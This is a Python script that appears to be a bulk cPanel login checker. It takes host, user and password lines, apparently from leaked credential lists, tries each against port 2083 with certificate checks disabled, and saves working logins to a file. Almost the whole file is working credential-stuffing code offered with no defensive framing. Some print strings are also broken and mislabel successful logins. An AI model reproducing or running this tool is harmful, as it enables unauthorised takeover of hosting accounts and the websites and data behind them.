import requests,urllib3
import re,io,os,requests
from threading import Thread
from multiprocessing.dummy import Pool
from colorama import *
from socket import *
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
merah = Fore.LIGHTRED_EX
hijau = Fore.LIGHTGREEN_EX
biru = Fore.BLUE
kuning = Fore.LIGHTYELLOW_EX
cyan = Fore.CYAN
reset = Fore.RESET
bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
res = Style.RESET_ALL
yl = Fore.YELLOW
cy = Fore.CYAN
mg = Fore.MAGENTA
bc = Back.GREEN
fr = Fore.RED
sr = Style.RESET_ALL
fb = Fore.BLUE
fc = Fore.LIGHTCYAN_EX
fg = Fore.GREEN
br = Back.RED
init(autoreset=True)

progres = 0

def screen_clear():
   # for mac and linux(here, os.name is 'posix')
   if os.name == 'posix':
      _ = os.system('clear')
   else:
      # for windows platfrom
      _ = os.system('cls')
screen_clear()


class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception:
                self.tasks.task_done()


#CPANELS
def cpanel(host, user, pswd):
    try:
        s = requests.Session()
        data = {"user":user,"pass":pswd}
        text = s.post("https://"+host+":2083/login", data=data, verify=False, allow_redirects=False, timeout=3).text
        if "URL=/cpses" in text:
            print("{fc}[{yl}Connection Timeout{fc}] {res}{host}{yl}|{res}{user}{yl}|{res}{pswd}")
            fopen = open("Valid_Cpanels.txt","a")
            fopen.write("https://"+host+":2083|"+user+"|"+pswd+"\n")
            fopen.close()
        else:
            print("{fc}[{red}BAD{fc}] {res}{host}{red}|{res}{user}{red}|{res}{pswd}")
        s.close()
    except KeyboardInterrupt:
        print("Closed")
        exit()
    except:
        print("{fc}[{yl}Connection Timeout{fc}] {res}{host}{yl}|{res}{user}{yl}|{res}{pswd}")
def cpa(url):
    try:
        prepare = url.split("|")
        if "://" in prepare[0]:
            host = prepare[0].split('://')[1]
        else:
            host = prepare[0]
        user = prepare[3]
        password = prepare[4]
        cpanel(host, user, password)
        if "_" in prepare[3]:
            userr = prepare[3].split("_")[0]
            ppp = str(userr)
            cpanel(host, ppp, password)
    except:
        pass
    pass
#FINE CPANELS


